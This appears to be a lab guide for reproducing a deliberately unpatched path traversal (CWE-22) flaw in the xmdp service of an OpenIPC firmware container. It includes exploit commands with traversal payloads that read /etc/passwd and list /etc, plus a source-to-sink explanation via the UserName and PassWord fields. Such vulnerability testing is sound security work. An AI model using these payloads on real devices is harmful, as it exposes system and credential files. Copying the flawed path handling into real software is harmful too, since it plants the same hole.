# CWE-22 Test Guide

This guide explains how to build, run and test the CWE-22 (Path Traversal) vulnerability in the xmdp project.

## Prerequisites

- Docker installed
- Git installed
- Basic knowledge of Linux commands

## Building and Running

1. Build the Docker image:
```bash
docker build -t openipc-firmware .
```

2. Run the container:
```bash
docker run -it --name openipc-test openipc-firmware
```

## Testing CWE-22

The test will be performed in two terminals:

### Terminal 1 (xmdp)
1. Inside the container, navigate to the xmdp directory:
```bash
cd /root/xmdp/general/package/xmdp/src
```

2. Run xmdp:
```bash
./xmdp
```

### Terminal 2 (exploit)
1. Open a new terminal
2. Enter the container:
```bash
docker exec -it openipc-test bash
```

3. Navigate to the exploit directory:
```bash
cd /root/xmdp/general/package/xmdp/src
```

4. Run the exploit:
```bash
# Example 1: Read /etc/passwd
python3 exploit_cwe22.py 127.0.0.1 34569 '//..//..//..//etc//passwd'

# Example 2: List /etc directory
python3 exploit_cwe22.py 127.0.0.1 34569 '//..//..//..//etc'
```

## Expected Results

When running the exploit, you should see:

1. In Terminal 1 (xmdp):
   - The payload being received
   - For Example 1: Contents of /etc/passwd being read
   - For Example 2: Directory listing of /etc

2. In Terminal 2 (exploit):
   - The exploit script should complete without waiting for response

## Understanding the Vulnerabilities

The project demonstrates two path traversal vulnerabilities:

### Example 1: File Reading
- SOURCE: User input from `UserName` field
- Transformations:
  1. Normalize slashes (//..//..//..//etc//passwd -> /etc/passwd)
- SINK: `fopen()` to read file contents

### Example 2: Directory Listing
- SOURCE: User input from `PassWord` field
- Transformations:
  1. Normalize slashes (//..//..//..//etc -> /etc)
  2. Convert to absolute path (ensures path starts with /)
- SINK: `scandir()` to list directory contents

## Troubleshooting

If you encounter issues:

1. Make sure xmdp is running in the first terminal
2. Verify the container is running: `docker ps`
3. Check if the ports are accessible: `netstat -tulpn | grep 34569`
4. Ensure you have proper permissions in the container

## Notes

- The exploit demonstrates two path traversal vulnerabilities:
  1. File reading through `UserName`
  2. Directory listing through `PassWord`
- The payload is sent via UDP broadcast
- No response is expected from the exploit script
- The vulnerabilities are intentionally left unpatched for testing purposes
- Both examples use realistic transformations that don't prevent path traversal 